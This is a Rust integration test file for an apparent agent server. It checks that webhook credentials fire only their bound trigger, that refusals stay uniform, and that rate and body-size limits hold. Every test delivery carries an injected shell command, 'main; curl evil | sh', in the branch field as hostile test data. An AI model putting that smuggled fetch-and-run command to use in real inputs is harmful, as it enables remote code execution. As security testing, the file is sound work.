//! A `hook` credential delivers to one trigger. It used to fire every
//! webhook trigger of the directory — the one whose own block grants `bash`
//! included — and the status told it which ids exist.
mod support;

use axum::body::Body;
use axum::http::{Request, StatusCode};
use serde_json::{json, Value};
use support::{
    bearer, body_string, call, fixture_with, now_secs, urlencode, Dirs, Fixture, Signer,
};

const AUDIENCE: &str = "agent-42";

fn fixture(signer: &Signer, interval: &str) -> Fixture {
    let key = signer.public_key();
    let interval = interval.to_string();
    fixture_with(
        move |dirs: &Dirs| {
            json!({
                "server": {
                    "auth": { "bearer": {
                        "keys": [key],
                        "audience": AUDIENCE,
                        "tokens_sha256": [
                            { "sha256": alforria_server::bearer::token_digest("static-inbox"),
                              "scope": "hook", "trigger": "inbox" },
                            { "sha256": alforria_server::bearer::token_digest("static-unbound"),
                              "scope": "hook" },
                        ],
                    } },
                    "directories": [dirs.repo.display().to_string()]
                },
                "triggers": { "webhook_min_interval": interval },
                "trigger": {
                    "inbox": { "on": { "webhook": true }, "prompt": "Triage the delivery" },
                    "deploy": { "on": { "webhook": true }, "prompt": "Deploy what the body names",
                                "permission": { "bash": "allow" } },
                    "paused": { "on": { "webhook": true }, "prompt": "x", "enabled": false },
                    "nightly": { "on": { "cron": "0 3 * * *" }, "prompt": "Tidy up" }
                }
            })
        },
        Some("hunter2"),
        Vec::new(),
    )
}

fn hook_token(signer: &Signer, trigger: Option<Value>) -> String {
    let mut claims = json!({ "aud": AUDIENCE, "scope": "hook", "exp": now_secs() + 300 });
    if let Some(trigger) = trigger {
        claims["trg"] = trigger;
    }
    bearer(&signer.sign(claims))
}

async fn deliver(f: &Fixture, id: &str, auth: &str) -> (StatusCode, String) {
    let dir = format!(
        "directory={}",
        urlencode(&f.dirs.repo.display().to_string())
    );
    let response = call(
        &f.router,
        "POST",
        &format!("/trigger/{id}/hook?{dir}"),
        Some(auth),
        Some(json!({ "branch": "main; curl evil | sh" })),
    )
    .await;
    let status = response.status();
    (status, body_string(response).await)
}

#[tokio::test]
async fn a_hook_token_fires_the_trigger_it_is_bound_to_and_no_other() {
    let signer = Signer::new();
    let f = fixture(&signer, "0s");
    let inbox = hook_token(&signer, Some(json!("inbox")));

    let (status, body) = deliver(&f, "inbox", &inbox).await;
    assert_eq!(status, StatusCode::OK, "{body}");

    // Any other id — a webhook trigger that grants bash, a paused one, a
    // cron trigger, one that does not exist — is the same refusal: nothing
    // tells them apart.
    let mut refusals = Vec::new();
    for id in ["deploy", "paused", "nightly", "nope"] {
        let (status, body) = deliver(&f, id, &inbox).await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{id}: {body}");
        refusals.push(body);
    }
    assert!(
        refusals.windows(2).all(|pair| pair[0] == pair[1]),
        "{refusals:?}"
    );

    // A hook credential without a binding delivers nowhere; a malformed
    // binding is not a credential at all.
    for id in ["inbox", "deploy", "nope"] {
        let (status, _) = deliver(&f, id, &hook_token(&signer, None)).await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{id}");
        let (status, _) = deliver(&f, id, &bearer("static-unbound")).await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{id}");
    }
    for bad in [json!(""), json!(7), json!(["inbox"])] {
        let (status, _) = deliver(&f, "inbox", &hook_token(&signer, Some(bad))).await;
        assert!(
            status == StatusCode::UNAUTHORIZED || status == StatusCode::FORBIDDEN,
            "{status}"
        );
    }

    // A static token carries its binding too.
    let (status, body) = deliver(&f, "inbox", &bearer("static-inbox")).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let (status, _) = deliver(&f, "deploy", &bearer("static-inbox")).await;
    assert_eq!(status, StatusCode::FORBIDDEN);

    // Bound to something that is not a deliverable webhook trigger: one
    // answer, whichever it is.
    let mut answers = Vec::new();
    for id in ["paused", "nightly", "nope"] {
        let (status, body) = deliver(&f, id, &hook_token(&signer, Some(json!(id)))).await;
        assert_eq!(status, StatusCode::NOT_FOUND, "{id}: {body}");
        answers.push(body);
    }
    assert!(
        answers.windows(2).all(|pair| pair[0] == pair[1]),
        "{answers:?}"
    );

    // The sidecar (`connector`) and the operator deliver to any webhook
    // trigger, with the informative errors.
    let connector = bearer(&signer.token(AUDIENCE, "connector"));
    let (status, body) = deliver(&f, "deploy", &connector).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let (status, _) = deliver(&f, "nightly", &connector).await;
    assert_eq!(status, StatusCode::CONFLICT);
    let (status, _) = deliver(&f, "nope", &connector).await;
    assert_eq!(status, StatusCode::NOT_FOUND);
}

#[tokio::test]
async fn a_webhook_trigger_takes_one_delivery_per_interval_and_a_bounded_body() {
    let signer = Signer::new();
    let f = fixture(&signer, "1h");
    let inbox = hook_token(&signer, Some(json!("inbox")));

    let (status, body) = deliver(&f, "inbox", &inbox).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    // Again at once: refused with a time to come back — per trigger, so a
    // second credential for the same trigger is refused too.
    for auth in [inbox.clone(), bearer("static-inbox")] {
        let dir = format!(
            "directory={}",
            urlencode(&f.dirs.repo.display().to_string())
        );
        let response = call(
            &f.router,
            "POST",
            &format!("/trigger/inbox/hook?{dir}"),
            Some(&auth),
            Some(json!({})),
        )
        .await;
        assert_eq!(response.status(), StatusCode::TOO_MANY_REQUESTS);
        assert!(response.headers().contains_key("retry-after"));
    }

    // A body over the cap is refused on its declared length, before any
    // of it is read, and when it lies about its length while streaming.
    let dir = format!(
        "directory={}",
        urlencode(&f.dirs.repo.display().to_string())
    );
    let huge = vec![b'x'; alforria_core::trigger::MAX_PAYLOAD_BYTES + 1];
    let request = Request::builder()
        .method("POST")
        .uri(format!("/trigger/inbox/hook?{dir}"))
        .header("authorization", &inbox)
        .header("content-length", huge.len())
        .body(Body::from(huge.clone()))
        .unwrap();
    let response = tower::ServiceExt::oneshot(f.router.clone(), request)
        .await
        .unwrap();
    assert_eq!(response.status(), StatusCode::PAYLOAD_TOO_LARGE);
    let chunks = futures::stream::iter(
        huge.chunks(64 * 1024)
            .map(|chunk| Ok::<_, std::io::Error>(chunk.to_vec()))
            .collect::<Vec<_>>(),
    );
    let request = Request::builder()
        .method("POST")
        .uri(format!("/trigger/inbox/hook?{dir}"))
        .header("authorization", &inbox)
        .body(Body::from_stream(chunks))
        .unwrap();
    let response = tower::ServiceExt::oneshot(f.router.clone(), request)
        .await
        .unwrap();
    assert_eq!(response.status(), StatusCode::PAYLOAD_TOO_LARGE);
}

/// P5.3. `serve` boots a directory at startup for its triggers only when
/// triggers are in use: nothing by default, the directories that hold a
/// stored trigger when there are some, the server's own directory too when
/// the config asks for triggers, and nothing at all when they are off.
#[tokio::test]
async fn serve_boots_directories_for_triggers_only_when_triggers_are_in_use() {
    let cwd = alforria_server::state::resolve_directory(&alforria_server::state::cwd());
    let seed = |f: &Fixture| {
        let (stored, state_only) = (
            f.dirs.repo.display().to_string(),
            f.dirs.other.display().to_string(),
        );
        f.ctx
            .storage
            .with_connection(|conn| {
                conn.execute(
                    "INSERT INTO \"trigger\"
                        (directory, id, project_id, spec, origin_session_id, time_created, time_updated)
                     VALUES (?1, 'nightly', 'global', ?2, NULL, 1, 1)",
                    rusqlite::params![
                        stored,
                        json!({ "on": { "interval": "1h" }, "prompt": "Tidy", "restricted": false })
                            .to_string()
                    ],
                )?;
                // What a config trigger leaves in a directory it ran in.
                conn.execute(
                    "INSERT INTO trigger_state (directory, trigger_id, time_seen)
                     VALUES (?1, 'from-config', 1)",
                    [&state_only],
                )?;
                Ok::<_, rusqlite::Error>(())
            })
            .unwrap();
    };

    // A default config and empty tables: no instance is booted.
    let f = fixture_with(|_| json!({}), None, Vec::new());
    assert!(f.ctx.policy.triggers_enabled && !f.ctx.policy.triggers_configured);
    assert_eq!(
        alforria_server::scheduled_directories(&f.ctx),
        Vec::<std::path::PathBuf>::new()
    );
    // A stored trigger: its directory, and no other — not the server's own
    // directory, not one that only has a config trigger's leftover state.
    seed(&f);
    assert_eq!(
        alforria_server::scheduled_directories(&f.ctx),
        vec![f.dirs.repo.clone()]
    );

    // The config asks for triggers: the server's directory and every
    // directory the trigger tables know.
    for config in [
        json!({ "triggers": { "enabled": true } }),
        json!({ "trigger": { "inbox": { "on": { "webhook": true }, "prompt": "Triage" } } }),
    ] {
        let f = fixture_with(|_| config.clone(), None, Vec::new());
        assert!(f.ctx.policy.triggers_configured, "{config}");
        assert_eq!(
            alforria_server::scheduled_directories(&f.ctx),
            vec![cwd.clone()]
        );
        seed(&f);
        let mut booted = alforria_server::scheduled_directories(&f.ctx);
        assert_eq!(booted.remove(0), cwd);
        booted.sort();
        let mut expected = vec![f.dirs.repo.clone(), f.dirs.other.clone()];
        expected.sort();
        assert_eq!(booted, expected, "{config}");
    }

    // Off wins over what is stored and what is declared.
    let f = fixture_with(
        |_| {
            json!({
                "triggers": { "enabled": false },
                "trigger": { "inbox": { "on": { "webhook": true }, "prompt": "Triage" } }
            })
        },
        None,
        Vec::new(),
    );
    seed(&f);
    assert!(!f.ctx.policy.triggers_configured);
    assert_eq!(
        alforria_server::scheduled_directories(&f.ctx),
        Vec::<std::path::PathBuf>::new()
    );
}
